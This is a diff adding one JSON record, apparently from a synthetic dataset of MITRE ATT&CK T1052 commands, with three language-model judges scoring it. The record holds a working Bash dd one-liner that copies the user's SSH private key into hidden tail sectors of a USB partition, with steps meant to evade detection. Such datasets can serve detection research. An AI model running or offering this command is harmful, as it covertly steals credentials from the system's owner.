@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "dd if=\"$HOME/.ssh/id_rsa\" of=\"/dev/disk/by-id/usb-SanDisk_Ultra_Fit_1234-0:0-part1\" bs=512 seek=$(( $(blockdev --getsz /dev/disk/by-id/usb-SanDisk_Ultra_Fit_1234-0:0-part1) - ( ($(stat -c%s \"$HOME/.ssh/id_rsa\")+511)/512 ) )) conv=notrunc,fsync status=none",
+  "explanation": "Writes the SSH private key into the tail end of the USB partition at a sector-aligned offset to avoid altering the partition table and minimize detection by the filesystem.",
+  "rationale_steps": [
+    "Determine the total sector count of the USB partition with blockdev --getsz",
+    "Calculate how many 512-byte sectors the file needs and compute a seek to place it near the end",
+    "Use dd to write directly to the raw USB partition with conv=notrunc,fsync and status=none to reduce output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-9ea3275c",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid arithmetic and command substitutions, and valid dd options.",
+        "semantic_score": 4,
+        "semantic_justification": "Effectively hides the SSH key at the end of the USB partition using sector-aligned dd writes, but typically needs elevated permissions and may risk filesystem corruption if the partition is mounted.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:51:48.619652Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with balanced quotes and parentheses, valid dd flags, and correct arithmetic expansion, though the nested command substitution with blockdev inside the arithmetic expression is complex and could fail in edge cases depending on shell interpretation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements steganographic-style exfiltration by writing the SSH private key to the tail sectors of a USB partition using dd with a calculated sector offset, avoiding filesystem metadata changes and partition table corruption, which is highly consistent with T1052's physical medium exfiltration with obfuscation.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:37:37.867544Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed bash one-liner with correctly nested command substitutions, arithmetic expansions, and valid utility flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a stealthy exfiltration technique by writing data to the trailing sectors of a physical device, utilizing correct block size and offset calculations.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:37:43.290618Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
